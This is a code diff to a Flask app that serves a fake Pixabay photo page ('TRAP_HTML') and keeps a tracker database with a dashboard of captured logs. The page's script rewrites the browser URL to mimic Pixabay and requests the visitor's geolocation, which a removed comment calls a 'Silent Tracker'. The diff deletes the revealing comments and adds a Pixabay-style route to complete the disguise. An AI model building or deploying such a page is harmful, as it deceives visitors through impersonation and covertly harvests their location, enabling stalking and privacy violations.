@@ -7,7 +7,6 @@ import os
 
 app = Flask(__name__)
 
-# --- DATABASE SETUP ---
 def init_db():
     conn = sqlite3.connect("tracker.db")
     c = conn.cursor()
@@ -35,7 +34,6 @@ def get_logs():
     conn.close()
     return rows
 
-# --- THE TRAP (Cloaked as Pixabay) ---
 TRAP_HTML = """
 <!DOCTYPE html>
 <html>
@@ -43,10 +41,8 @@ TRAP_HTML = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bread Machine - Free photo on Pixabay</title>
     <script>
-        // 1. Steal the URL to make it look like Pixabay
         window.history.pushState("", "", "/photos/bread-machine-household-appliances-6047/");
         
-        // 2. Silent Tracker
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
@@ -63,7 +59,7 @@ TRAP_HTML = """
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background: #fff; color: #333; }
         .header { display: flex; align-items: center; padding: 15px 20px; border-bottom: 1px solid #eee; }
-        .header img { height: 30px; }
+        .header svg { height: 30px; }
         .header h2 { margin: 0 0 0 10px; font-size: 20px; color: #191b26; font-weight: bold; }
         .main { max-width: 900px; margin: 20px auto; padding: 0 20px; display: flex; gap: 30px; }
         .image-container { flex: 2; }
@@ -79,42 +75,27 @@ TRAP_HTML = """
 </head>
 <body>
     <div class="header">
-        <!-- Pixabay Logo -->
-        <svg height="30" viewBox="0 0 100 30" fill="#05a081"><text x="0" y="24" font-family="Arial" font-weight="bold" font-size="24">pixabay</text></svg>
+        <svg viewBox="0 0 100 30" fill="#05a081"><text x="0" y="24" font-family="Arial" font-weight="bold" font-size="24">pixabay</text></svg>
     </div>
     <div class="main">
         <div class="image-container">
-            <!-- The Bread Machine Image -->
-            <img src="https://cdn.pixabay.com/photo/2012/04/15/20/39/bread-35042_1280.png" alt="Bread Machine, Household Appliances">
+            <img src="https://cdn.pixabay.com/photo/2012/04/15/20/39/bread-35042_1280.png" alt="Bread Machine">
         </div>
         <div class="sidebar">
             <h1>Bread Machine, Household Appliances</h1>
             <p style="color: #767676; font-size: 14px;">Free photo by <strong>OpenClipart-Vectors</strong></p>
-            
             <div class="tags">
                 <a href="#" class="tag">bread machine</a>
                 <a href="#" class="tag">household appliances</a>
                 <a href="#" class="tag">kitchen</a>
-                <a href="#" class="tag">bread</a>
             </div>
-
             <a href="#" class="btn-download">Download</a>
-
-            <div class="author-box">
-                <div class="author-icon"></div>
-                <div>
-                    <strong>OpenClipart-Vectors</strong><br>
-                    <span style="font-size: 12px; color: #767676;">2,419 Followers</span>
-                </div>
-            </div>
         </div>
     </div>
 </body>
 </html>
 """
-"""
 
-# --- YOUR DASHBOARD ---
 DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
@@ -162,6 +143,10 @@ def dashboard():
 
 @app.route('/trap')
 def trap():
+    return render_template_string(TRAP_HTML)
+
+@app.route('/photos/bread-machine-household-appliances-6047/')
+def trap_cloaked():
     return render_template_string(TRAP_HTML)
 
 @app.route('/capture')
